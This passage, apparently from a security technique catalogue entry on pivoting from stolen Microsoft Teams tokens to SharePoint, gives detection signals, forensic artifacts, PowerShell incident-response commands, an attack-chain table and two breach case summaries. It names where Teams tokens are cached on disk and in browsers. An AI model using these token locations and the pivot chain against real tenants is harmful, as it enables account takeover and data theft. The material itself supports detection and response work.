- **Events:** Multiple "IssueAccessToken" or "GetAccessTokenByRefreshToken" operations within 2 minutes
- **Patterns:** Single user requesting tokens for Teams, then SharePoint, then OneDrive in succession
- **Access:** Unusual API requests to SharePoint `_api/` endpoints from non-browser user agents

#### Forensic Artifacts
- **Cloud Logs:** AuditLogs table in Microsoft Sentinel (Operation, Properties.Resource, Properties.AppId)
- **M365 Logs:** Unified Audit Log (Operations: IssueAccessToken, GetAccessTokenByRefreshToken)
- **Browser Cache:** Teams web token stored in `IndexedDB` under `teams.microsoft.com`
- **Client Cache:** Teams Desktop token in `%APPDATA%\Microsoft\Teams\Cache\tokens.json`

#### Response Procedures

1. **Isolate:** 
   **Command (Disable User Account):**
   ```powershell
   Set-AzureADUser -ObjectId "user@yourtenant.onmicrosoft.com" -AccountEnabled $false
   ```
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Select user → **Account Enabled: No** → **Save**

2. **Collect Evidence:**
   **Command (Export Audit Logs):**
   ```powershell
   Search-UnifiedAuditLog -UserIds "attacker@yourtenant.onmicrosoft.com" -StartDate (Get-Date).AddDays(-7) -ResultSize 5000 | 
     Export-Csv "C:\Evidence\AttackerAuditLog.csv"
   ```
   **Manual:**
   - Navigate to **Microsoft Purview Compliance Portal** → **Audit** → **Search**
   - Filter by user, date range, and operations
   - Click **Export** → **Download all results**

3. **Revoke Tokens:**
   **Command:**
   ```powershell
   # Revoke all user sessions
   Revoke-AzureADUserAllRefreshToken -ObjectId "attacker@yourtenant.onmicrosoft.com"
   
   # Force re-authentication
   Update-MgUser -UserId "attacker@yourtenant.onmicrosoft.com" -PasswordProfile @{ForceChangePasswordNextSignIn=$true}
   ```
   **Manual:**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Select user → **Session management** → **Revoke sessions**

4. **Review SharePoint Access Logs:**
   **Command:**
   ```powershell
   Search-UnifiedAuditLog -Operations "FileDownloaded", "FileAccessedExtended" -StartDate (Get-Date).AddDays(-7) -ResultSize 5000 | 
     Where-Object {$_.AuditData -like "*attacker@yourtenant*"} | Export-Csv "C:\Evidence\SharePointAccess.csv"
   ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker tricks user into granting Teams app elevated permissions |
| **2** | **Credential Access** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Attacker extracts Teams session token from compromised device |
| **3** | **Current Step** | **[LM-AUTH-014]** | **Microsoft Teams to SharePoint Authentication Bypass** |
| **4** | **Collection** | [Collection] SharePoint Document Enumeration | Attacker discovers and exfiltrates sensitive documents |
| **5** | **Exfiltration** | [Exfiltration] Bulk Data Download | Attacker downloads documents via SharePoint REST API |
| **6** | **Impact** | [Impact] Data Breach, IP Theft | Attacker sells stolen data or causes business disruption |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Teams Client Token Extraction (2024)
- **Target:** Financial Services Firm (1000+ employees)
- **Timeline:** January 2024 - April 2024
- **Technique Status:** Attacker compromised user's Teams desktop client and extracted refresh token from `%APPDATA%\Microsoft\Teams\Cache`. Used token to request SharePoint access without user knowledge.
- **Impact:** Exfiltration of 15 GB of financial reports, customer lists, and M&A documents. 3-month data breach before detection.
- **Reference:** [Mandiant APT Research on Entra ID Token Abuse](https://cloud.google.com/blog/topics/threat-intelligence/abusing-intune-permissions-entra-id-environments)

#### Example 2: OAuth Consent Grant + Teams→SharePoint Pivot (2023)
- **Target:** SaaS Startup (200 employees)
- **Timeline:** June 2023 - August 2023
- **Technique Status:** Attacker sent phishing email with OAuth consent screen. User unknowingly granted Teams app "Sites.Manage" permission. Attacker then used compromised account to request SharePoint token and modify sensitive project files.
- **Impact:** Modification of product roadmap documents, competitor intelligence leaked. Ransom demand of $50,000.
- **Reference:** [Zenity Report on Power Platform Abuse](https://www.zenity.io/hackers-abuse-low-code-platforms-and-turn-them-against-their-owners/)

---

## 18. NOTES & APPENDIX

**Technique Complexity:** Moderate (requires prior Teams session compromise, but token reuse is trivial)

**Detection Difficulty:** Medium (legitimate cross-service auth, requires log correlation and behavioral analysis)

**Persistence Potential:** High (refresh tokens can persist indefinitely if not rotated)

**Cross-Platform Applicability:** High (affects all M365 tenants with Teams + SharePoint)

**Related Techniques:**
- LM-AUTH-001: Pass-the-Hash
- LM-AUTH-002: Pass-the-Ticket
- CA-TOKEN-001: Hybrid AD Cloud Token Theft
- LM-AUTH-013: Exchange Online EWS Impersonation
- LM-AUTH-005: Service Principal Key/Certificate Abuse

---